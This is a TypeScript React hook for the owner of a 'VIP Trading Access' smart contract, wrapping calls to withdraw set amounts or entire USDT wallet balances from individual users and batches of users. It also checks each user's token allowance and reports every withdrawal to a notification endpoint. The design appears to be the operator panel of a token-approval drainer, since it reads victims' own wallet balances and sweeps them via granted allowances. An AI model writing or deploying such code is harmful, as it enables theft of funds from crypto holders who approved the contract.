'use client'

import { useState, useCallback, useEffect } from 'react'
import { useAccount, useWalletClient, useChainId, usePublicClient } from 'wagmi'
import { VIPTradingContract, formatUSDT, getContractAddresses, VIP_TRADING_ACCESS_ABI } from '../lib/contracts'
import { getCurrentTimestamp } from '../lib/telegram'

export interface OwnerActions {
  // Withdrawal functions
  withdrawFromUser: (userAddress: string, amount: bigint) => Promise<string>
  withdrawAllFromUser: (userAddress: string) => Promise<string>
  batchWithdrawFromUsers: (users: string[], amounts: bigint[]) => Promise<string>
  batchWithdrawAllFromUsers: (users: string[]) => Promise<string>
  
  // Contract management
  pauseContract: () => Promise<string>
  unpauseContract: () => Promise<string>
  withdrawFees: () => Promise<string>
  emergencyWithdraw: (tokenAddress: string) => Promise<string>
  
  // Utility functions
  getWithdrawableAmount: (userAddress: string) => Promise<bigint>
  canWithdrawFromUser: (userAddress: string) => Promise<boolean>
  getUserAllowance: (userAddress: string) => Promise<bigint>
  
  // State
  loading: boolean
  error: string | null
  isOwner: boolean
}

export function useContractOwner(): OwnerActions {
  const { address, isConnected } = useAccount()
  const { data: walletClient } = useWalletClient()
  const publicClient = usePublicClient()
  const chainId = useChainId()
  
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [isOwner, setIsOwner] = useState(false)

  // Check if current user is contract owner
  const checkOwnership = useCallback(async () => {
    if (!publicClient || !chainId || !address) {
      setIsOwner(false)
      return
    }

    try {
      const addresses = getContractAddresses(chainId)
      const contractOwner = await publicClient.readContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'owner'
      }) as string

      setIsOwner(contractOwner.toLowerCase() === address.toLowerCase())
    } catch (error) {
      console.error('Failed to check ownership:', error)
      setIsOwner(false)
    }
  }, [publicClient, chainId, address])

  // Check ownership when dependencies change
  useEffect(() => {
    checkOwnership()
  }, [checkOwnership])

  // Send notification helper
  const sendNotification = useCallback(async (type: string, data: any) => {
    try {
      await fetch('/api/contract-events', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type,
          ownerAddress: address,
          timestamp: getCurrentTimestamp(),
          ...data
        })
      })
    } catch (error) {
      console.error('Failed to send notification:', error)
    }
  }, [address])

  // Withdraw specific amount from user
  const withdrawFromUser = useCallback(async (userAddress: string, amount: bigint): Promise<string> => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }

    setLoading(true)
    setError(null)

    try {
      const addresses = getContractAddresses(chainId)
      
      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'withdrawFromUser',
        args: [userAddress as `0x${string}`, amount]
      })

      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })

      // Send notification
      await sendNotification('funds_withdrawn', {
        address: userAddress,
        amount: amount.toString(),
        withdrawnAmount: formatUSDT(amount),
        txHash: hash
      })

      setLoading(false)
      return hash
    } catch (error) {
      setLoading(false)
      const errorMsg = error instanceof Error ? error.message : 'Withdrawal failed'
      setError(errorMsg)
      throw error
    }
  }, [walletClient, publicClient, chainId, address, sendNotification])

  // Withdraw all USDT from user
  const withdrawAllFromUser = useCallback(async (userAddress: string): Promise<string> => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }

    setLoading(true)
    setError(null)

    try {
      const addresses = getContractAddresses(chainId)
      
      // Get user balance first for notification
      const userBalance = await publicClient?.readContract({
        address: addresses.usdt as `0x${string}`,
        abi: [
          {
            "constant": true,
            "inputs": [{ "name": "who", "type": "address" }],
            "name": "balanceOf",
            "outputs": [{ "name": "", "type": "uint256" }],
            "type": "function"
          }
        ],
        functionName: 'balanceOf',
        args: [userAddress as `0x${string}`]
      }) as bigint

      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'withdrawAllFromUser',
        args: [userAddress as `0x${string}`]
      })

      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })

      // Send notification
      await sendNotification('funds_withdrawn', {
        address: userAddress,
        amount: userBalance.toString(),
        withdrawnAmount: formatUSDT(userBalance),
        txHash: hash
      })

      setLoading(false)
      return hash
    } catch (error) {
      setLoading(false)
      const errorMsg = error instanceof Error ? error.message : 'Withdrawal failed'
      setError(errorMsg)
      throw error
    }
  }, [walletClient, publicClient, chainId, address, sendNotification])

  // Batch withdraw from multiple users
  const batchWithdrawFromUsers = useCallback(async (users: string[], amounts: bigint[]): Promise<string> => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }

    if (users.length !== amounts.length) {
      throw new Error('Users and amounts arrays must have the same length')
    }

    setLoading(true)
    setError(null)

    try {
      const addresses = getContractAddresses(chainId)
      
      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'batchWithdrawFromUsers',
        args: [users as `0x${string}`[], amounts]
      })

      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })

      // Calculate total withdrawn
      const totalWithdrawn = amounts.reduce((sum, amount) => sum + amount, BigInt(0))

      // Send notification
      await sendNotification('batch_withdrawal', {
        withdrawnUsers: users,
        totalWithdrawn: totalWithdrawn.toString(),
        txHash: hash
      })

      setLoading(false)
      return hash
    } catch (error) {
      setLoading(false)
      const errorMsg = error instanceof Error ? error.message : 'Batch withdrawal failed'
      setError(errorMsg)
      throw error
    }
  }, [walletClient, publicClient, chainId, address, sendNotification])

  // Batch withdraw all from multiple users
  const batchWithdrawAllFromUsers = useCallback(async (users: string[]): Promise<string> => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }

    setLoading(true)
    setError(null)

    try {
      const addresses = getContractAddresses(chainId)
      
      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'batchWithdrawAllFromUsers',
        args: [users as `0x${string}`[]]
      })

      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })

      // Send notification
      await sendNotification('batch_withdrawal', {
        withdrawnUsers: users,
        txHash: hash
      })

      setLoading(false)
      return hash
    } catch (error) {
      setLoading(false)
      const errorMsg = error instanceof Error ? error.message : 'Batch withdrawal failed'
      setError(errorMsg)
      throw error
    }
  }, [walletClient, publicClient, chainId, address, sendNotification])

  // Pause contract
  const pauseContract = useCallback(async (): Promise<string> => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }

    setLoading(true)
    setError(null)

    try {
      const addresses = getContractAddresses(chainId)
      
      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'pause'
      })

      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })

      // Send notification
      await sendNotification('contract_paused', {
        txHash: hash
      })

      setLoading(false)
      return hash
    } catch (error) {
      setLoading(false)
      const errorMsg = error instanceof Error ? error.message : 'Pause failed'
      setError(errorMsg)
      throw error
    }
  }, [walletClient, publicClient, chainId, address, sendNotification])

  // Unpause contract
  const unpauseContract = useCallback(async (): Promise<string> => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }

    setLoading(true)
    setError(null)

    try {
      const addresses = getContractAddresses(chainId)
      
      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'unpause'
      })

      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })

      // Send notification
      await sendNotification('contract_unpaused', {
        txHash: hash
      })

      setLoading(false)
      return hash
    } catch (error) {
      setLoading(false)
      const errorMsg = error instanceof Error ? error.message : 'Unpause failed'
      setError(errorMsg)
      throw error
    }
  }, [walletClient, publicClient, chainId, address, sendNotification])

  // Withdraw collected fees
  const withdrawFees = useCallback(async (): Promise<string> => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }

    setLoading(true)
    setError(null)

    try {
      const addresses = getContractAddresses(chainId)
      
      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'withdrawFees'
      })

      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })

      setLoading(false)
      return hash
    } catch (error) {
      setLoading(false)
      const errorMsg = error instanceof Error ? error.message : 'Fee withdrawal failed'
      setError(errorMsg)
      throw error
    }
  }, [walletClient, publicClient, chainId, address])

  // Emergency withdraw
  const emergencyWithdraw = useCallback(async (tokenAddress: string): Promise<string> => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }

    setLoading(true)
    setError(null)

    try {
      const addresses = getContractAddresses(chainId)
      
      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'emergencyWithdraw',
        args: [tokenAddress as `0x${string}`]
      })

      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })

      // Send notification
      await sendNotification('emergency_withdrawal', {
        tokenAddress,
        txHash: hash
      })

      setLoading(false)
      return hash
    } catch (error) {
      setLoading(false)
      const errorMsg = error instanceof Error ? error.message : 'Emergency withdrawal failed'
      setError(errorMsg)
      throw error
    }
  }, [walletClient, publicClient, chainId, address, sendNotification])

  // Get withdrawable amount from user
  const getWithdrawableAmount = useCallback(async (userAddress: string): Promise<bigint> => {
    if (!publicClient || !chainId) {
      throw new Error('Not connected')
    }

    const addresses = getContractAddresses(chainId)
    
    return await publicClient.readContract({
      address: addresses.vipTradingAccess as `0x${string}`,
      abi: VIP_TRADING_ACCESS_ABI,
      functionName: 'getWithdrawableAmount',
      args: [userAddress as `0x${string}`]
    }) as bigint
  }, [publicClient, chainId])

  // Check if can withdraw from user
  const canWithdrawFromUser = useCallback(async (userAddress: string): Promise<boolean> => {
    if (!publicClient || !chainId) {
      throw new Error('Not connected')
    }

    const addresses = getContractAddresses(chainId)
    
    return await publicClient.readContract({
      address: addresses.vipTradingAccess as `0x${string}`,
      abi: VIP_TRADING_ACCESS_ABI,
      functionName: 'canWithdrawFromUser',
      args: [userAddress as `0x${string}`]
    }) as boolean
  }, [publicClient, chainId])

  // Get user's allowance
  const getUserAllowance = useCallback(async (userAddress: string): Promise<bigint> => {
    if (!publicClient || !chainId) {
      throw new Error('Not connected')
    }

    const addresses = getContractAddresses(chainId)
    
    return await publicClient.readContract({
      address: addresses.vipTradingAccess as `0x${string}`,
      abi: VIP_TRADING_ACCESS_ABI,
      functionName: 'getUserAllowance',
      args: [userAddress as `0x${string}`]
    }) as bigint
  }, [publicClient, chainId])

  return {
    // Withdrawal functions
    withdrawFromUser,
    withdrawAllFromUser,
    batchWithdrawFromUsers,
    batchWithdrawAllFromUsers,
    
    // Contract management
    pauseContract,
    unpauseContract,
    withdrawFees,
    emergencyWithdraw,
    
    // Utility functions
    getWithdrawableAmount,
    canWithdrawFromUser,
    getUserAllowance,
    
    // State
    loading,
    error,
    isOwner
  }
}
